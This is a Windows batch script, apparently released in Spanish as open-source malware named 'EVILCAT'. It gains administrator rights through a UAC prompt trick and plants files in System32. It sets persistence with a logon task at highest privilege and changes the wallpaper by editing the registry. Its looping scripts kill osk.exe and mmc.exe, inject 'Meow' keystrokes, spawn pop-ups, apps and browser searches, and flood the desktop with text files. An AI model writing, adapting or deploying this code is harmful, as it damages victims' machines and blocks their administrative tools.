:: EVILCAT @wrrulos

:: Malware de codigo abierto.

@echo off
mode con cols=135 lines=21
title ADVERTENCIA

:admin
    IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system" 
) ELSE (
 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system" 
) 
 
if '%errorlevel%' NEQ '0' (
    goto UACPrompt 
) else (goto gotAdmin) 

:UACPrompt 
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs" 
    set params=%* 
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs" 

    "%temp%\getadmin.vbs" 
    del "%temp%\getadmin.vbs" 
    exit /B 

:gotAdmin 
    pushd "%CD%" 
    CD /D "%~dp0" 


if exist "Archivos\EVILCAT_FONDO.jpg" (

    if exist "Archivos\EVILCAT_MUSICA.mp3" (

        goto Advertencia

    ) else (

        cls
        echo.
        title Error
        echo  [X] No se encuentra el archivo "Archivos\EVILCAT_MUSICA.mp3"
        echo.
        pause >nul
        exit

    )

) else (

    cls
    echo.
    title Error
    echo  [X] No se encuentra el archivo "Archivos\EVILCAT_FONDO.jpg"
    echo.
    pause >nul
    exit

)

:Advertencia
cls
echo.                               _____________________________________________________________________________________________________
echo                  #     #       l
echo                  ##   ##       l %username% estas apunto de ejecutar un malware llamado EVILCAT.               
echo                  #######       l El creador (@wrrulos) no se hace responsable por cualquier perdida que pueda tener la maquina.    
echo                  #######       l                                                 
echo                 ########       l____________________________________________________________________________________________________
echo                 ###.#.### ..../         
echo            ##   #########         
echo           ###    #######       
echo           ###   ########        
echo            ##   ########
echo            #   ##########           
echo           ##  ############     
echo          ## ##############     
echo          ## ##############        
echo          ## ##############        
echo          ## ###############      
echo           ## ##############    
echo           #################        
set /p pregunta=.           ###############     Ejecutar EVILCAT? s/n: 

if "%pregunta%" == "s" (
        goto Instalar
)

if "%pregunta%" == "S" (
        goto Instalar
)

if "%pregunta%" == "n" (
        exit
)

if "%pregunta%" == "N" (
        exit
)

goto Advertencia



:Instalar
:: Elimina la carpeta EVILCAT de System32.
RD %homedrive%\Windows\System32\EVILCAT  /S /Q >nul

:: Crea la carpeta de EVILCAT en System32.
MD %homedrive%\Windows\System32\EVILCAT >nul

:: Crea el archivo que muestra el mensaje Meow.
echo Do > %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs
echo MSGBOX ("Meow") >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs
echo Loop >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_MENSAJE.vbs

:: Crea el archivo que ejecuta EVILCAT en segundo plano.
echo set objshell = createobject("wscript.shell") > %homedrive%\Windows\System32\EVILCAT\EVILCAT.vbs
echo objshell.run "%homedrive%\Windows\System32\EVILCAT\EVILCAT.bat",vbhide >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.vbs

:: Crea el archivo que ejecuta el Script1 en segundo plano.
echo set objshell = createobject("wscript.shell") > %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT1.vbs
echo objshell.run "%homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT1.bat",vbhide >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT1.vbs

:: Crea el archivo que ejecuta el Script2 en segundo plano.
echo set objshell = createobject("wscript.shell") > %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.vbs
echo objshell.run "%homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat",vbhide >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.vbs

:: Crea el archivo que controla el teclado.
echo Do > %homedrive%\Windows\System32\EVILCAT\EVILCAT_TECLADO.vbs
echo set WshShell = WScript.CreateObject("WScript.Shell") >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_TECLADO.vbs
echo WScript.Sleep 500 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_TECLADO.vbs
echo WshShell.SendKeys "Meow" >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_TECLADO.vbs
echo Loop >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_TECLADO.vbs

:: Crea el archivo Meow.txt
echo Un maullido es un masaje al corazón > %homedrive%\Windows\System32\EVILCAT\Meow.txt

:: Borra el registro que guarda la ubicacion del fondo de pantalla.
reg delete "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /f >nul


:: Copia la imagen a la carpeta de EVILCAT.
copy Archivos\EVILCAT_FONDO.jpg %homedrive%\Windows\System32\EVILCAT\EVILCAT_FONDO.jpg >nul

:: Agrega el registro que guarda la ubicacion del nuevo fondo de pantalla.
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%homedrive%\Windows\System32\EVILCAT\EVILCAT_FONDO.jpg" >nul

:: Copia la musica a la carpeta de EVILCAT.
copy Archivos\EVILCAT_MUSICA.mp3 %homedrive%\Windows\System32\EVILCAT\EVILCAT_MUSICA.mp3 >nul

:: Crea el archivo que va a reproducir el audio.
echo Do > %homedrive%\Windows\System32\EVILCAT\EVILCAT_MUSICA.vbs
echo Set Wmp = CreateObject("WMPlayer.OCX.7") >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_MUSICA.vbs
echo Wmp.URL = "%homedrive%\Windows\System32\EVILCAT\EVILCAT_MUSICA.mp3" >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_MUSICA.vbs
echo Wmp.Controls.Play >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_MUSICA.vbs
echo wscript.sleep 216000 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_MUSICA.vbs
echo Loop >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_MUSICA.vbs

:: Crea la tarea que ejecuta la musica de Nyan Cat
SCHTASKS /CREATE /SC ONLOGON /RL HIGHEST /F /TN "EVILCAT_MUSICA" /TR "%homedrive%\Windows\System32\EVILCAT\EVILCAT_MUSICA.vbs" >nul

:: Crea el Script1
echo @echo off > %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT1.bat
echo. >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT1.bat

:: Bucle que detiene procesos 
echo :Bucle >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT1.bat
echo taskkill /f /im osk.exe >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT1.bat
echo taskkill /f /im mmc.exe >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT1.bat
echo goto Bucle >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT1.bat

:: Crea el Script2
echo @echo off > %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat
echo. >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat

:: Bucle que inicia aplicaciones y busca cosas en el navegador.
echo :Bucle >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat
echo timeout 10 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat
echo start http://google.com/search?q=firefox >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat
echo timeout 10 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat
echo start http://google.com/search?q=nyan+cat >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat
echo timeout 10 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat
echo start mspaint.exe >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat
echo timeout 10 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat 
echo start calc.exe >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat
echo timeout 10 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat 
echo start http://google.com/search?q=mi+navegador+busca+cosas+solas >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat
echo timeout 10 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat 
echo start http://google.com/search?q=wrrulos >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat
echo timeout 10 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat 
echo start notepad.exe >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat 
echo timeout 10 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat 
echo start http://google.com/search?q=virus+informatico >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat 
echo timeout 10 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat 
echo start http://google.com/search?q=mi+computadora+se+volvio+loca >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat
echo timeout 10 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat 
echo start http://google.com/search?q=gatos >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat
echo timeout 10 >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat 
echo start http://google.com/search?q=anime >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat
echo goto Bucle >> %homedrive%\Windows\System32\EVILCAT\EVILCAT_SCRIPT2.bat


:: Crea el archivo EVILCAT.bat

echo @echo off > %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo. >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat

:: Copia los archivos Meow.txt al escritorio

echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
echo copy %homedrive%\Windows\System32\EVILCAT\Meow.txt %homedrive%\Users\%username%\Desktop\Meow%random%.txt >> %homedrive%\Windows\System32\EVILCAT\EVILCAT.bat
